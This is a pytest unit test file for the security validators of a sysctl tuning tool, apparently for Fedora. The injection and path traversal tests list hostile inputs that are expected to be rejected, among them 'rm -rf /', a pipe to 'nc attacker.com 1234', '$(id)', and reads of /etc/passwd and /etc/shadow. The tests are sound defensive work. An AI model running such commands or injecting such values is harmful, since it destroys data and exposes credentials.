"""
Unit tests for security module.
"""
import pytest
import sys
import os
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))

from modules.optimizer.security import (
    validate_sysctl_param,
    validate_sysctl_value,
    validate_file_path,
    sanitize_string,
    ValidationError
)


class TestSysctlParamValidation:
    """Test sysctl parameter validation"""
    
    @pytest.mark.unit
    def test_valid_params(self):
        """Test that valid parameters pass"""
        valid_params = [
            "vm.swappiness",
            "net.ipv4.tcp_congestion_control",
            "kernel.sched_latency_ns",
            "fs.inotify.max_user_watches",
        ]
        
        for param in valid_params:
            assert validate_sysctl_param(param) is True
    
    @pytest.mark.unit
    def test_command_injection_attempts(self):
        """Test that command injection attempts are blocked"""
        malicious_params = [
            "vm.swappiness; rm -rf /",
            "vm.swappiness | nc attacker.com 1234",
            "vm.swappiness && echo pwned",
            "vm.swappiness`whoami`",
            "vm.swappiness$(id)",
        ]
        
        for param in malicious_params:
            with pytest.raises(ValidationError):
                validate_sysctl_param(param)
    
    @pytest.mark.unit
    def test_invalid_formats(self):
        """Test invalid parameter formats"""
        invalid_params = [
            ".vm.swappiness",  # Starts with dot
            "vm.swappiness.",  # Ends with dot
            "vm..swappiness",  # Consecutive dots
            "VM.SWAPPINESS",   # Uppercase
            "",                # Empty
        ]
        
        for param in invalid_params:
            with pytest.raises(ValidationError):
                validate_sysctl_param(param)
    
    @pytest.mark.unit
    def test_length_limit(self):
        """Test parameter length limit"""
        # 129 characters - should fail
        long_param = "a" * 129
        
        with pytest.raises(ValidationError):
            validate_sysctl_param(long_param)


class TestSysctlValueValidation:
    """Test sysctl value validation"""
    
    @pytest.mark.unit
    def test_valid_values(self):
        """Test that valid values pass"""
        valid_values = [
            "10",
            "bbr",
            "balance_performance",
            "1000000",
            "my-value_123",
        ]
        
        for value in valid_values:
            assert validate_sysctl_value(value) is True
    
    @pytest.mark.unit
    def test_command_injection_attempts(self):
        """Test that command injection in values is blocked"""
        malicious_values = [
            "10; rm -rf /",
            "10 | nc attacker.com 1234",
            "10 && echo pwned",
            "10`whoami`",
            "10$(id)",
            "10 || cat /etc/passwd",
        ]
        
        for value in malicious_values:
            with pytest.raises(ValidationError):
                validate_sysctl_value(value)
    
    @pytest.mark.unit
    def test_dangerous_characters(self):
        """Test that dangerous characters are blocked"""
        dangerous_chars = [
            ("10;", ";"),
            ("10|", "|"),
            ("10&", "&"),
            ("10$", "$"),
            ("10`", "`"),
            ("10(", "("),
            ("10)", ")"),
        ]
        
        for value, char in dangerous_chars:
            with pytest.raises(ValidationError) as exc_info:
                validate_sysctl_value(value)
            assert char in str(exc_info.value)


class TestFilePathValidation:
    """Test file path validation"""
    
    @pytest.mark.unit
    def test_valid_absolute_paths(self):
        """Test valid absolute paths"""
        valid_paths = [
            "/etc/sysctl.d/99-fedoraclean.conf",
            "/var/lib/fedoraclean/transactions.json",
        ]
        
        for path in valid_paths:
            assert validate_file_path(path) is True
    
    @pytest.mark.unit
    def test_path_traversal_attempts(self):
        """Test that path traversal is blocked"""
        traversal_attempts = [
            "/etc/../../../etc/passwd",
            "/var/lib/../../etc/shadow",
            "../relative/path",
        ]
        
        for path in traversal_attempts:
            with pytest.raises(ValidationError):
                validate_file_path(path)
    
    @pytest.mark.unit
    def test_relative_path_rejected(self):
        """Test that relative paths are rejected"""
        with pytest.raises(ValidationError):
            validate_file_path("relative/path")
    
    @pytest.mark.unit
    def test_allowed_directories(self):
        """Test allowed directories enforcement"""
        allowed = ["/etc/sysctl.d", "/var/lib/fedoraclean"]
        
        # Should pass
        assert validate_file_path("/etc/sysctl.d/test.conf", allowed)
        
        # Should fail
        with pytest.raises(ValidationError):
            validate_file_path("/tmp/malicious.conf", allowed)


class TestSanitization:
    """Test string sanitization"""
    
    @pytest.mark.unit
    def test_sanitize_removes_null_bytes(self):
        """Test that null bytes are removed"""
        dirty = "test\x00value"
        clean = sanitize_string(dirty)
        
        assert '\x00' not in clean
        assert clean == "testvalue"
    
    @pytest.mark.unit
    def test_sanitize_strips_whitespace(self):
        """Test that whitespace is stripped"""
        dirty = "  test value  "
        clean = sanitize_string(dirty)
        
        assert clean == "test value"
    
    @pytest.mark.unit
    def test_sanitize_limits_length(self):
        """Test that length is limited"""
        dirty = "a" * 300
        clean = sanitize_string(dirty, max_length=100)
        
        assert len(clean) == 100
